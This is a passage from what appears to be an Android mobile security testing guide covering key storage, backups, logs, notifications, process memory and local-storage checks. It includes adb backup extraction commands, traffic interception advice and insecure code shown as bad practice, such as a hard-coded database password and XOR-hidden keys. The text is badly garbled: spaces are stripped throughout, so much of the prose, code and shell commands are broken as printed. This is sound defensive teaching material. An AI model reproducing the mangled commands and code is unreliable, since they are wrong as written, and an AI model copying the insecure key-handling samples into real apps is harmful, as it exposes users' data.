recommended way is to use the Android KeyStore API system (itself or through KeyChain) to storekeymaterial. Ifitispossible, hardware-backedstorageshouldbeused. Otherwise, itshouldfallbacktosoftware implementationofAndroidKeystore. However,beawarethattheAndroidKeyStoreAPIhasbeenchangedsignificantly throughoutversionsofAndroid. Inearlierversions, theAndroidKeyStoreAPIonlysupportedstoringpublic/privatekey pairs(e.g.,RSA).SymmetrickeysupporthasonlybeenaddedsinceAndroid6.0(APIlevel23). Asaresult,adeveloper needstohandlethedifferentAndroidAPIlevelstosecurelystoresymmetrickeys. Storing keys by encrypting them with other keys InordertosecurelystoresymmetrickeysondevicesrunningonAndroid5.1(APIlevel22)orlower,weneedtogeneratea public/privatekeypair. WeencryptthesymmetrickeyusingthepublickeyandstoretheprivatekeyintheAndroidKey- Store. Theencryptedsymmetrickeycanbeencodedusingbase64andstoredintheSharedPreferences. Wheneverwe needthesymmetrickey,theapplicationretrievestheprivatekeyfromtheAndroidKeyStoreanddecryptsthesymmetric key. Envelopeencryption,orkeywrapping,isasimilarapproachthatusessymmetricencryptiontoencapsulatekeymaterial. Dataencryptionkeys(DEKs)canbeencryptedwithkeyencryptionkeys(KEKs)whicharesecurelystored. EncryptedDEKs canbestoredinSharedPreferencesorwrittentofiles. Whenrequired,theapplicationreadstheKEK,thendecryptsthe DEK.RefertoOWASPCryptographicStorageCheatSheettolearnmoreaboutencryptingcryptographickeys. Also, as the illustration of this approach, refer to the EncryptedSharedPreferences from androidx.security.crypto pack- age. Insecure options to store keys Alesssecurewayofstoringencryptionkeys,isintheSharedPreferencesofAndroid. WhenSharedPreferencesareused, thefileisonlyreadablebytheapplicationthatcreatedit. However, onrooteddevices, anyotherapplicationwithroot access can read the SharedPreferences file of other apps. This is not the case for the AndroidKeyStore, since Android- KeyStore access is managed on the kernel level, which needs considerably more work and skill to bypass without the AndroidKeyStoreclearingordestroyingthekeys. Thelastthreeoptionsaretousehardcodedencryptionkeysinthesourcecode,havingapredictableobfuscationfunction orkeyderivationfunctionbasedonstableattributes,andstoringgeneratedkeysinpublicplaceslike/sdcard/. Hardcoded encryptionkeysareanissue,sincethismeanseveryinstanceoftheapplicationusesthesameencryptionkey. Anattacker can reverse-engineer a local copy of the application to extract the cryptographic key, and use that key to decrypt any datawhichwasencryptedbytheapplicationonanydevice. Next,whenyouhaveapredictablekeyderivationfunctionbasedonidentifierswhichareaccessibletootherapplications, theattackeronlyneedstofindtheKDFandapplyittothedevicetofindthekey. Lastly,storingencryptionkeyspublicly isalsohighlydiscouraged,asotherapplicationscanhavepermissiontoreadthepublicpartitionandstealthekeys. Data Encryption Using Third Party Libraries Thereareseveraldifferentopen-sourcelibrariesthatofferencryptioncapabilitiesspecifictotheAndroidplatform. • JavaAESCrypto-AsimpleAndroidclassforencryptinganddecryptingstrings. 199\n• SQL Cipher-SQLCipherisanopensourceextensiontoSQLitethatprovidestransparent256-bitAESencryption ofdatabasefiles. • Themis-Across-platformhigh-levelcryptographiclibrarythatprovidesthesameAPIacrossmanyplatforms,for securingdataduringauthentication,storage,messaging,etc. PleasekeepinmindthataslongasthekeyisnotstoredintheKeyStore,itisalwayspossibletoeasilyretrievethe keyonarooteddeviceandthendecryptthevaluesyouaretryingtoprotect. KeyChain The KeyChain class is used to store and retrieve system-wide private keys and their corresponding certificates (chain). The user will be prompted to set a lock screen pin or password to protect the credential storage if something is being importedintotheKeyChainforthefirsttime. NotethattheKeyChainissystem-wide, everyapplicationcanaccessthe materialsstoredintheKeyChain. InspectthesourcecodetodeterminewhethernativeAndroidmechanismsidentifysensitiveinformation. Sensitiveinfor- mationshouldbeencrypted,notstoredincleartext. Forsensitiveinformationthatmustbestoredonthedevice,several APIcallsareavailabletoprotectthedataviatheKeyChainclass. Completethefollowingsteps: • Make sure that the app is using the Android KeyStore and Cipher mechanisms to securely store encrypted infor- mationonthedevice. LookforthepatternsAndroidKeystore,import java.security.KeyStore,import javax. crypto.Cipher,import java.security.SecureRandom,andcorrespondingusages. • Usethestore(OutputStream stream, char[] password)functiontostoretheKeyStoretodiskwithapassword. Makesurethatthepasswordisprovidedbytheuser,nothard-coded. Logs Therearemanylegitimatereasonstocreatelogfilesonamobiledevice, suchaskeepingtrackofcrashes, errors, and usagestatistics. Logfilescanbestoredlocallywhentheappisofflineandsenttotheendpointoncetheappisonline. However, logging sensitive data may expose the data to attackers or malicious applications, and it might also violate userconfidentiality. Youcancreatelogfilesinseveralways. Thefollowinglistincludestwoclassesthatareavailablefor Android: • LogClass • LoggerClass Backups Android provides users with an auto-backup feature. The backups usually include copies of data and settings for all installedapps. Givenitsdiverseecosystem,Androidsupportsmanybackupoptions: • StockAndroidhasbuilt-inUSBbackupfacilities. WhenUSBdebuggingisenabled,usetheadb backupcommand tocreatefulldatabackupsandbackupsofanapp’sdatadirectory. • Googleprovidesa“BackUpMyData”featurethatbacksupallappdatatoGoogle’sservers. • TwoBackupAPIsareavailabletoappdevelopers: – Key/ValueBackup(BackupAPIorAndroidBackupService)uploadstotheAndroidBackupServicecloud. – AutoBackupforApps: WithAndroid6.0(APIlevel23)andabove, Googleaddedthe“AutoBackupforApps feature”. Thisfeatureautomaticallysyncsatmost25MBofappdatawiththeuser’sGoogleDriveaccount. • OEMsmayprovideadditionaloptions. Forexample,HTCdeviceshavea“HTCBackup”optionthatperformsdaily backupstothecloudwhenactivated. Apps must carefully ensure that sensitive user data doesn’t end within these backups as this may allow an attacker to extractit. 200\nADB Backup Support Android provides an attribute called allowBackup to back up all your application data. This attribute is set in the AndroidManifest.xmlfile. Ifthevalueofthisattributeistrue,thedeviceallowsuserstobackuptheapplicationwith AndroidDebugBridge(ADB)viathecommand$ adb backup. Topreventtheappdatabackup,settheandroid:allowBackupattributetofalse. Whenthisattributeisunavailable,the allowBackupsettingisenabledbydefault,andbackupmustbemanuallydeactivated. Note: Ifthedevicewasencrypted,thenthebackupfileswillbeencryptedaswell. Process Memory AllapplicationsonAndroidusememorytoperformnormalcomputationaloperationslikeanyregularmodern-daycom- puter. Itisofnosurprisethenthatattimessensitiveoperationswillbeperformedwithinprocessmemory. Forthisreason, itisimportantthatoncetherelevantsensitivedatahasbeenprocessed,itshouldbedisposedfromprocessmemoryas quicklyaspossible. Theinvestigationofanapplication’smemorycanbedonefrommemorydumps,andfromanalyzingthememoryinreal timeviaadebugger. For an overview of possible sources of data exposure, check the documentation and identify application components before you examine the source code. For example, sensitive data from a backend may be in the HTTP client, the XML parser,etc. Youwantallthesecopiestoberemovedfrommemoryassoonaspossible. Inaddition, understandingtheapplication’sarchitectureandthearchitecture’sroleinthesystemwillhelpyouidentify sensitive information that doesn’t have to be exposed in memory at all. For example, assume your app receives data from one server and transfers it to another without any processing. That data can be handled in an encrypted format, whichpreventsexposureinmemory. However,ifyouneedtoexposesensitivedatainmemory,youshouldmakesurethatyourappisdesignedtoexposeas fewdatacopiesaspossibleasbrieflyaspossible. Inotherwords,youwantthehandlingofsensitivedatatobecentralized (i.e.,withasfewcomponentsaspossible)andbasedonprimitive,mutabledatastructures. The latter requirement gives developers direct memory access. Make sure that they use this access to overwrite the sensitivedatawithdummydata(typicallyzeroes). Examplesofpreferabledatatypesincludebyte []andchar [],but notStringorBigInteger. WheneveryoutrytomodifyanimmutableobjectlikeString,youcreateandchangeacopy oftheobject. Using non-primitive mutable types like StringBuffer and StringBuilder may be acceptable, but it’s indicative and requires care. Types like StringBuffer are used to modify content (which is what you want to do). To access such a type’svalue,however,youwouldusethetoStringmethod,whichwouldcreateanimmutablecopyofthedata. There areseveralwaystousethesedatatypeswithoutcreatinganimmutablecopy,buttheyrequiremoreeffortthanusinga primitivearray. SafememorymanagementisonebenefitofusingtypeslikeStringBuffer,butthiscanbeatwo-edged sword. Ifyoutrytomodifythecontentofoneofthesetypesandthecopyexceedsthebuffercapacity, thebuffersize willautomaticallyincrease. Thebuffercontentmaybecopiedtoadifferentlocation, leavingtheoldcontentwithouta referenceusetooverwriteit. Unfortunately,fewlibrariesandframeworksaredesignedtoallowsensitivedatatobeoverwritten. Forexample,destroy- ingakey,asshownbelow,doesn’tremovethekeyfrommemory: ExampleinJava: SecretKeysecretKey =newSecretKeySpec("key".getBytes(),"AES"); secretKey.destroy(); ExampleinKotlin: valsecretKey:SecretKey =SecretKeySpec("key".toByteArray(),"AES") secretKey.destroy() 201\nOverwritingthebackingbyte-arrayfromsecretKey.getEncodeddoesn’tremovethekeyeither;theSecretKeySpec-based key returns a copy of the backing byte-array. See the sections below for the proper way to remove a SecretKey from memory. The RSA key pair is based on the BigInteger type and therefore resides in memory after its first use outside the An- droidKeyStore. Someciphers(suchastheAESCipherinBouncyCastle)donotproperlycleanuptheirbyte-arrays. User-provideddata(credentials,socialsecuritynumbers,creditcardinformation,etc.) isanothertypeofdatathatmay beexposedinmemory. Regardlessofwhetheryouflagitasapasswordfield,EditTextdeliverscontenttotheappvia theEditableinterface. Ifyourappdoesn’tprovideEditable.Factory,user-provideddatawillprobablybeexposedin memory for longer than necessary. The default Editable implementation, the SpannableStringBuilder, causes the sameissuesasJava’sStringBuilderandStringBuffercause(discussedabove). Third-party Services Embedded in the App Thefeaturesprovidedbythird-partyservicescaninvolvetrackingservicestomonitortheuser’sbehaviorwhileusingthe app,sellingbanneradvertisements,orimprovingtheuserexperience. Thedownsideisthatdevelopersdon’tusuallyknowthedetailsofthecodeexecutedviathird-partylibraries. Consequently, nomoreinformationthanisnecessaryshouldbesenttoaservice,andnosensitiveinformationshouldbedisclosed. Mostthird-partyservicesareimplementedintwoways: • withastandalonelibrary • withafullSDK User Interface UI Components Atcertainpointsintime,theuserwillhavetoentersensitiveinformationintotheapplication. Thisdatamaybefinancial informationsuchascreditcarddataoruseraccountpasswords,ormaybehealthcaredata. Thedatamaybeexposedif theappdoesn’tproperlymaskitwhileitisbeingtyped. In order to prevent disclosure and mitigate risks such as shoulder surfing you should verify that no sensitive data is exposed via the user interface unless explicitly required (e.g. a password being entered). For the data required to be presentitshouldbeproperlymasked,typicallybyshowingasterisksordotsinsteadofcleartext. Screenshots Manufacturerswanttoprovidedeviceuserswithanaestheticallypleasingexperienceatapplicationstartupandexit,so they introduced the screenshot-saving feature for use when the application is backgrounded. This feature may pose a securityrisk. Sensitivedatamaybeexposediftheuserdeliberatelyscreenshotstheapplicationwhilesensitivedatais displayed. A malicious application that is running on the device and able to continuously capture the screen may also exposedata. Screenshotsarewrittentolocalstorage,fromwhichtheymayberecoveredbyarogueapplication(ifthe deviceisrooted)orsomeonewhohasstolenthedevice. For example, capturing a screenshot of a banking application may reveal information about the user’s account, credit, transactions,andsoon. App Notifications Itisimportanttounderstandthatnotificationsshouldneverbeconsideredprivate. Whenanotificationishandledbythe Androidsystemitisbroadcastedsystem-wideandanyapplicationrunningwithaNotificationListenerServicecanlisten forthesenotificationstoreceivetheminfullandmayhandlethemhoweveritwants. TherearemanyknownmalwaresamplessuchasJoker,andAlienwhichabusestheNotificationListenerServiceto listenfornotificationsonthedeviceandthensendthemtoattacker-controlledC2infrastructure. Commonlythisisdone 202\ntolistenfortwo-factorauthentication(2FA)codesthatappearasnotificationsonthedevicewhicharethensenttothe attacker. Asaferalternativefortheuserwouldbetousea2FAapplicationthatdoesnotgeneratenotifications. FurthermorethereareanumberofappsontheGooglePlayStorethatprovidenotificationlogging,whichlogslocallyany notificationsontheAndroidsystem. ThishighlightsthatnotificationsareinnowayprivateonAndroidandaccessibleby anyotherapponthedevice. Forthisreasonallnotificationusageshouldbeinspectedforconfidentialorhighriskinformationthatcouldbeusedby maliciousapplications. Keyboard Cache Whenusersenterinformationininputfields,thesoftwareautomaticallysuggestsdata. Thisfeaturecanbeveryusefulfor messagingapps. However,thekeyboardcachemaydisclosesensitiveinformationwhentheuserselectsaninputfield thattakesthistypeofinformation. Determining Whether Sensitive Data Is Shared with Third Parties via Embedded Services Platform: android MASVSV1: MSTG-STORAGE-4 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis To determine whether API calls and functions provided by the third-party library are used according to best practices, reviewtheirsourcecode,requestedpermissionsandcheckforanyknownvulnerabilities. Alldatathat’ssenttothird-partyservicesshouldbeanonymizedtopreventexposureofPII(PersonalIdentifiableInforma- tion)thatwouldallowthethirdpartytoidentifytheuseraccount. Nootherdata(suchasIDsthatcanbemappedtoa useraccountorsession)shouldbesenttoathirdparty. Dynamic Analysis Check all requests to external services for embedded sensitive information. To intercept traffic between the client and server,youcanperformdynamicanalysisbylaunchingaman-in-the-middle(MITM)attackwithBurpSuiteProfessionalor OWASPZAP.Onceyouroutethetrafficthroughtheinterceptionproxy,youcantrytosniffthetrafficthatpassesbetween theappandserver. Allapprequeststhataren’tsentdirectlytotheserveronwhichthemainfunctionishostedshould becheckedforsensitiveinformation,suchasPIIinatrackeroradservice. Determining Whether Sensitive Data Is Shared with Third Parties via Notifications Platform: android MASVSV1: MSTG-STORAGE-4 MASVSV2: MASVS-STORAGE-2 203\nOverview Static Analysis SearchforanyusageoftheNotificationManagerclasswhichmightbeanindicationofsomeformofnotificationmanage- ment. Iftheclassisbeingused,thenextstepwouldbetounderstandhowtheapplicationisgeneratingthenotifications andwhichdataendsupbeingshown. Dynamic Analysis Run the application and start tracing all calls to functions related to the notifications creation, e.g. setContentTitle or setContentText from NotificationCompat.Builder. Observe the trace in the end and evaluate if it contains any sensitiveinformationwhichanotherappmighthaveeavesdropped. Testing Backups for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-8 MASVSV2: MASVS-STORAGE-2 Overview Static Analysis Local ChecktheAndroidManifest.xmlfileforthefollowingflag: android:allowBackup="true" If the flag value is true, determine whether the app saves any kind of sensitive data (check the test case “Testing for SensitiveDatainLocalStorage”). Cloud Regardlessofwhetheryouusekey/valuebackuporautobackup,youmustdeterminethefollowing: • whichfilesaresenttothecloud(e.g.,SharedPreferences) • whetherthefilescontainsensitiveinformation • whethersensitiveinformationisencryptedbeforebeingsenttothecloud. Ifyoudon’twanttosharefileswithGoogleCloud,youcanexcludethemfromAutoBackup. Sensitiveinformation storedatrestonthedeviceshouldbeencryptedbeforebeingsenttothecloud. • AutoBackup: YouconfigureAutoBackupviathebooleanattributeandroid:allowBackupwithintheapplication’s manifest file. Auto Backup is enabled by default for applications that target Android 6.0 (API level 23). You can usetheattributeandroid:fullBackupOnlytoactivateautobackupwhenimplementingabackupagent,butthis attributeisavailableforAndroidversions6.0andaboveonly. OtherAndroidversionsusekey/valuebackupinstead. android:fullBackupOnly Auto backup includes almost all the app files and stores up 25 MB of them per app in the user’s Google Drive account. Onlythemostrecentbackupisstored;thepreviousbackupisdeleted. 204\n• Key/Value Backup: Toenablekey/valuebackup,youmustdefinethebackupagentinthemanifestfile. Lookin AndroidManifest.xmlforthefollowingattribute: android:backupAgent Toimplementkey/valuebackup,extendoneofthefollowingclasses: • BackupAgent • BackupAgentHelper Tocheckforkey/valuebackupimplementations,lookfortheseclassesinthesourcecode. Dynamic Analysis Afterexecutingallavailableappfunctions, attempttobackupviaadb. Ifthebackupissuccessful, inspectthebackup archiveforsensitivedata. Openaterminalandrunthefollowingcommand: adbbackup -apk -nosystem <package-name> ADBshouldrespondnowwith“Nowunlockyourdeviceandconfirmthebackupoperation”andyoushouldbeaskedon the Android phone for a password. This is an optional step and you don’t need to provide one. If the phone does not promptthismessage,trythefollowingcommandincludingthequotes: adbbackup "-apk-nosystem<package-name>" Theproblemhappenswhenyourdevicehasanadbversionpriorto1.0.31. Ifthat’sthecaseyoumustuseanadbversion of1.0.31alsoonyourhostcomputer. Versionsofadbafter1.0.32brokethebackwardscompatibility. ApprovethebackupfromyourdevicebyselectingtheBackupmydataoption. Afterthebackupprocessisfinished,the file.abwillbeinyourworkingdirectory. Runthefollowingcommandtoconvertthe.abfiletotar. ddif=mybackup.abbs=24skip=1|opensslzlib -d>mybackup.tar Incaseyougettheerroropenssl:Error: 'zlib' is an invalid command. youcantrytousePythoninstead. ddif=backup.abbs=1skip=24 |python -c"importzlib,sys;sys.stdout.write(zlib.decompress(sys.stdin.read()))" >backup.tar The Android Backup Extractor is another alternative backup tool. To make the tool to work, you have to download the OracleJCEUnlimitedStrengthJurisdictionPolicyFilesforJRE7orJRE8andplacethemintheJRElib/securityfolder. Run thefollowingcommandtoconvertthetarfile: java -jar abe.jarunpackbackup.ab ifitshowssomeCipherinformationandusage,whichmeansithasn’tunpackedsuccessfully. Inthiscaseyoucangivea trywithmorearguments: abe[-debug][-useenv=yourenv]unpack <backup.ab><backup.tar>[password] [password]isthepasswordwhenyourandroiddeviceaskedyouearlier. Forexamplehereis: 123 java -jar abe.jarunpackbackup.abbackup.tar123 Extractthetarfiletoyourworkingdirectory. 205\ntarxvfmybackup.tar Testing Local Storage for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-1,MSTG-STORAGE-2 MASVSV2: MASVS-STORAGE-1 Overview Thistestcasefocusesonidentifyingpotentiallysensitivedatastoredbyanapplicationandverifyingifitissecurelystored. Thefollowingchecksshouldbeperformed: • Analyzedatastorageinthesourcecode. • Besuretotriggerallpossiblefunctionalityintheapplication(e.g.byclickingeverywherepossible)inordertoensure datageneration. • Checkallapplicationgeneratedandmodifiedfilesandensurethatthestoragemethodissufficientlysecure. – ThisincludesSharedPreferences,SQLdatabases,RealmDatabases,InternalStorage,ExternalStorage,etc. Ingeneralsensitivedatastoredlocallyonthedeviceshouldalwaysbeatleastencrypted,andanykeysusedforencryption methodsshouldbesecurelystoredwithintheAndroidKeystore. Thesefilesshouldalsobestoredwithintheapplication sandbox. Ifachievablefortheapplication,sensitivedatashouldbestoredoffdeviceor,evenbetter,notstoredatall. Static Analysis First of all, try to determine the kind of storage used by the Android app and to find out whether the app processes sensitivedatainsecurely. • Check AndroidManifest.xml for read/write external storage permissions, for example, uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE". • CheckthesourcecodeforkeywordsandAPIcallsthatareusedtostoredata: – Filepermissions,suchas: ∗ MODE_WORLD_READABLE or MODE_WORLD_WRITABLE: You should avoid using MODE_WORLD_WRITEABLE and MODE_WORLD_READABLE for files because any app will be able to read from or write to the files, even if they are stored in the app’s private data directory. If data must be shared with other applications, consideracontentprovider. Acontentprovideroffersreadandwritepermissionstootherappsandcan grantdynamicpermissiononacase-by-casebasis. – Classesandfunctions,suchas: ∗ theSharedPreferencesclass(storeskey-valuepairs) ∗ theFileOutPutStreamclass(usesinternalorexternalstorage) ∗ thegetExternal*functions(useexternalstorage) ∗ thegetWritableDatabasefunction(returnsaSQLiteDatabaseforwriting) ∗ thegetReadableDatabasefunction(returnsaSQLiteDatabaseforreading) ∗ thegetCacheDirandgetExternalCacheDirsfunction(usecachedfiles) EncryptionshouldbeimplementedusingprovenSDKfunctions. Thefollowingdescribesbadpracticestolookforinthe sourcecode: • Locallystoredsensitiveinformation“encrypted”viasimplebitoperationslikeXORorbitflipping. Theseoperations shouldbeavoidedbecausetheencrypteddatacanberecoveredeasily. • KeysusedorcreatedwithoutAndroidonboardfeatures,suchastheAndroidKeyStore • Keysdisclosedbyhard-coding 206\nA typical misuse are hard-coded cryptographic keys. Hard-coded and world-readable cryptographic keys significantly increasethepossibilitythatencrypteddatawillberecovered. Onceanattackerobtainsthedata,decryptingitistrivial. Symmetric cryptography keys must be stored on the device, so identifying them is just a matter of time and effort. Considerthefollowingcode: this.db=localUserSecretStore.getWritableDatabase("SuperPassword123"); Obtainingthekeyistrivialbecauseitiscontainedinthesourcecodeandidenticalforallinstallationsoftheapp. Encrypting datathis way is notbeneficial. Lookfor hard-codedAPI keys/privatekeysand other valuable data; they pose asimilar risk. Encoded/encryptedkeysrepresentanotherattempttomakeitharderbutnotimpossibletogetthecrownjewels. Considerthefollowingcode: ExampleinJava: //AmorecomplicatedefforttostoretheXOR'edhalvesofakey(insteadofthekeyitself) private static final String[]myCompositeKey =newString[]{ "oNQavjbaNNSgEqoCkT9Em4imeQQ=","3o8eFOX4ri/F8fgHgiy/BS47" }; ExampleinKotlin: private valmyCompositeKey =arrayOf<String>("oNQavjbaNNSgEqoCkT9Em4imeQQ=", "3o8eFOX4ri/F8fgHgiy/BS47") Thealgorithmfordecodingtheoriginalkeymightbesomethinglikethis: ExampleinJava: public void useXorStringHiding(StringmyHiddenMessage){ byte[]xorParts0 =Base64.decode(myCompositeKey[0],0); byte[]xorParts1 =Base64.decode(myCompositeKey[1],0); byte[]xorKey =newbyte[xorParts0.length]; for(inti=0;i<xorParts1.length;i++){ xorKey[i]=(byte)(xorParts0[i]^xorParts1[i]); } HidingUtil.doHiding(myHiddenMessage.getBytes(),xorKey,false); } ExampleinKotlin: funuseXorStringHiding(myHiddenMessage:String){ valxorParts0 =Base64.decode(myCompositeKey[0],0) valxorParts1 =Base64.decode(myCompositeKey[1],0) valxorKey =ByteArray(xorParts0.size) for(iinxorParts1.indices) { xorKey[i]=(xorParts0[i]xorxorParts1[i]).toByte() } HidingUtil.doHiding(myHiddenMessage.toByteArray(),xorKey,false) } Verifycommonlocationsofsecrets: • resources(typicallyatres/values/strings.xml)Example: <resources> <string name="app_name">SuperApp</string> <string name="hello_world">Helloworld!</string> <string name="action_settings">Settings</string> <string name="secret_key">My_Secret_Key</string> </resources> • buildconfigs,suchasinlocal.propertiesorgradle.propertiesExample: buildTypes { debug { minifyEnabled true buildConfigField "String","hiddenPassword","\"${hiddenPassword}\"" } } 207\nDynamic Analysis Installandusetheapp,executingallfunctionsatleastonce. Datacanbegeneratedwhenenteredbytheuser,sentby theendpoint,orshippedwiththeapp. Thencompletethefollowing: • Checkbothinternalandexternallocalstorageforanyfilescreatedbytheapplicationthatcontainsensitivedata. • Identifydevelopmentfiles,backupfiles,andoldfilesthatshouldn’tbeincludedwithaproductionrelease. • Determine whether SQLite databases are available and whether they contain sensitive information. SQLite databasesarestoredin/data/data/<package-name>/databases. • IdentifyifSQLitedatabasesareencrypted. Ifso, determinehowthedatabasepasswordisgeneratedandstored andifthisissufficientlyprotectedasdescribedinthe“StoringaKey”sectionoftheKeystoreoverview. • Check Shared Preferences that are stored as XML files (in /data/data/<package-name>/shared_prefs) for sen- sitive information. Shared Preferences are insecure and unencrypted by default. Some apps might opt to use secure-preferencestoencryptthevaluesstoredinSharedPreferences. • Check the permissions of the files in /data/data/<package-name>. Only the user and group created when you installedtheapp(e.g.,u0_a82)shouldhaveuserread,write,andexecutepermissions(rwx). Otherusersshould nothavepermissiontoaccessfiles,buttheymayhaveexecutepermissionsfordirectories. • CheckfortheusageofanyFirebaseReal-timedatabasesandattempttoidentifyiftheyaremisconfiguredbymaking thefollowingnetworkcall: – https://_firebaseProjectName_.firebaseio.com/.json • Determine whether a Realm database is available in /data/data/<package-name>/files/, whether it is unen- crypted,andwhetheritcontainssensitiveinformation. Bydefault,thefileextensionisrealmandthefilenameis default. InspecttheRealmdatabasewiththeRealmBrowser. Testing Memory for Sensitive Data Platform: android MASVSV1: MSTG-STORAGE-10 MASVSV2: MASVS-STORAGE-2 Overview Analyzingmemorycanhelpdevelopersidentifytherootcausesofseveralproblems,suchasapplicationcrashes. However, itcanalsobeusedtoaccesssensitivedata. Thissectiondescribeshowtocheckfordatadisclosureviaprocessmemory. First identify sensitive information that is stored in memory. Sensitive assets have likely been loaded into memory at somepoint. Theobjectiveistoverifythatthisinformationisexposedasbrieflyaspossible. To investigate an application’s memory, you must first create a memory dump. You can also analyze the memory in real-time,e.g.,viaadebugger. Regardlessofyourapproach,memorydumpingisaveryerror-proneprocessintermsof verificationbecauseeachdumpcontainstheoutputofexecutedfunctions. Youmaymissexecutingcriticalscenarios. In addition,overlookingdataduringanalysisisprobableunlessyouknowthedata’sfootprint(eithertheexactvalueorthe dataformat). Forexample,iftheappencryptswitharandomlygeneratedsymmetrickey,youlikelywon’tbeabletospot itinmemoryunlessyoucanrecognizethekey’svalueinanothercontext. Therefore,youarebetteroffstartingwithstaticanalysis. Static Analysis Whenperformingstaticanalysistoidentifysensitivedatathatisexposedinmemory,youshould: • Trytoidentifyapplicationcomponentsandmapwheredataisused. • Makesurethatsensitivedataishandledbyasfewcomponentsaspossible. • Makesurethatobjectreferencesareproperlyremovedoncetheobjectcontainingthesensitivedataisnolonger needed. • Makesurethatgarbagecollectionisrequestedafterreferenceshavebeenremoved. 208\n• Makesurethatsensitivedatagetsoverwrittenassoonasitisnolongerneeded. – Don’trepresentsuchdatawithimmutabledatatypes(suchasStringandBigInteger). – Avoidnon-primitivedatatypes(suchasStringBuilder). – Overwritereferencesbeforeremovingthem,outsidethefinalizemethod. – Payattentiontothird-partycomponents(librariesandframeworks). PublicAPIsaregoodindicators. Determine whetherthepublicAPIhandlesthesensitivedataasdescribedinthischapter. Thefollowingsectiondescribespitfallsofdataleakageinmemoryandbestpracticesforavoidingthem. Don’tuseimmutablestructures(e.g., StringandBigInteger)torepresentsecrets. Nullifyingthesestructureswillbe ineffective: thegarbagecollectormaycollectthem, buttheymayremainontheheapaftergarbagecollection. Never- theless, you should ask for garbage collection after every critical operation (e.g., encryption, parsing server responses thatcontainsensitiveinformation). Whencopiesoftheinformationhavenotbeenproperlycleaned(asexplainedbelow), yourrequestwillhelpreducethelengthoftimeforwhichthesecopiesareavailableinmemory. Toproperlycleansensitiveinformationfrommemory,storeitinprimitivedatatypes,suchasbyte-arrays(byte[])and char-arrays(char[]). Youshouldavoidstoringtheinformationinmutablenon-primitivedatatypes. Makesuretooverwritethecontentofthecriticalobjectoncetheobjectisnolongerneeded. Overwritingthecontentwith zeroesisonesimpleandverypopularmethod: ExampleinJava: byte[]secret =null; try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { if(null !=secret){ Arrays.fill(secret,(byte)0); } } ExampleinKotlin: valsecret:ByteArray?=null try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { if(null !=secret){ Arrays.fill(secret,0.toByte()) } } Thisdoesn’t,however,guaranteethatthecontentwillbeoverwrittenatruntime. Tooptimizethebytecode,thecompiler willanalyzeanddecidenottooverwritedatabecauseitwillnotbeusedafterwards(i.e.,itisanunnecessaryoperation). EvenifthecodeisinthecompiledDEX,theoptimizationmayoccurduringthejust-in-timeorahead-of-timecompilation intheVM. Thereisnosilverbulletforthisproblembecausedifferentsolutionshavedifferentconsequences. Forexample,youmay performadditionalcalculations(e.g., XORthedataintoadummybuffer), butyou’llhavenowaytoknowtheextentof thecompiler’soptimizationanalysis. Ontheotherhand, usingtheoverwrittendataoutsidethecompiler’sscope(e.g., serializingitinatempfile)guaranteesthatitwillbeoverwrittenbutobviouslyimpactsperformanceandmaintenance. Then,usingArrays.filltooverwritethedataisabadideabecausethemethodisanobvioushookingtarget(seethe chapter“TamperingandReverseEngineeringonAndroid”formoredetails). Thefinalissuewiththeaboveexampleisthatthecontentwasoverwrittenwithzeroesonly. Youshouldtrytooverwrite criticalobjectswithrandomdataorcontentfromnon-criticalobjects. Thiswillmakeitreallydifficulttoconstructscanners thatcanidentifysensitivedataonthebasisofitsmanagement. Belowisanimprovedversionofthepreviousexample: ExampleinJava: byte[]nonSecret =somePublicString.getBytes("ISO-8859-1"); byte[]secret =null; try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { 209\nif(null !=secret){ for(inti=0;i<secret.length;i++){ secret[i]=nonSecret[i%nonSecret.length]; } FileOutputStreamout =newFileOutputStream("/dev/null"); out.write(secret); out.flush(); out.close(); } } ExampleinKotlin: valnonSecret:ByteArray =somePublicString.getBytes("ISO-8859-1") valsecret:ByteArray?=null try{ //getorgeneratethesecret,doworkwithit,makesureyoumakenolocalcopies }finally { if(null !=secret){ for(iinsecret.indices){ secret[i]=nonSecret[i%nonSecret.size] } valout=FileOutputStream("/dev/null") out.write(secret) out.flush() out.close() } } Formoreinformation,takealookatSecurelyStoringSensitiveDatainRAM. Inthe“StaticAnalysis”section,wementionedtheproperwaytohandlecryptographickeyswhenyouareusingAndroid- KeyStoreorSecretKey. For a better implementation of SecretKey, look at the SecureSecretKey class below. Although the implementation is probably missing some boilerplate code that would make the class compatible with SecretKey, it addresses the main securityconcerns: • Nocross-contexthandlingofsensitivedata. Eachcopyofthekeycanbeclearedfromwithinthescopeinwhichit wascreated. • Thelocalcopyisclearedaccordingtotherecommendationsgivenabove. ExampleinJava: public class SecureSecretKey implements javax.crypto.SecretKey,Destroyable { private byte[]key; private final Stringalgorithm; /**ConstructsSecureSecretKeyinstanceoutofacopyoftheprovidedkeybytes. *Thecallerisresponsibleofclearingthekeyarrayprovidedasinput. *Theinternalcopyofthekeycanbeclearedbycallingthedestroy() method. */ public SecureSecretKey(final byte[]key,final Stringalgorithm){ this.key=key.clone(); this.algorithm =algorithm; } public String getAlgorithm(){ return this.algorithm; } public String getFormat(){ return "RAW"; } /**Returnsacopyofthekey. *Makesuretoclearthereturnedbytearraywhennolongerneeded. */ public byte[]getEncoded(){ if(null ==key){ throw newNullPointerException(); } return key.clone(); } /**Overwritesthekeywithdummydatatoensurethiscopyisnolongerpresentinmemory.*/ public void destroy(){ if(isDestroyed()){ 210\nreturn; } byte[]nonSecret =newString("RuntimeException").getBytes("ISO-8859-1"); for(inti=0;i<key.length;i++){ key[i]=nonSecret[i%nonSecret.length]; } FileOutputStreamout =newFileOutputStream("/dev/null"); out.write(key); out.flush(); out.close(); this.key=null; System.gc(); } public boolean isDestroyed(){ return key==null; } } ExampleinKotlin: class SecureSecretKey(key:ByteArray,algorithm:String):SecretKey,Destroyable { private varkey:ByteArray? private valalgorithm:String override fungetAlgorithm():String { return algorithm } override fungetFormat():String { return "RAW" } /**Returnsacopyofthekey. *Makesuretoclearthereturnedbytearraywhennolongerneeded. */ override fungetEncoded():ByteArray { if(null ==key){ throw NullPointerException() } return key!!.clone() } /**Overwritesthekeywithdummydatatoensurethiscopyisnolongerpresentinmemory.*/ 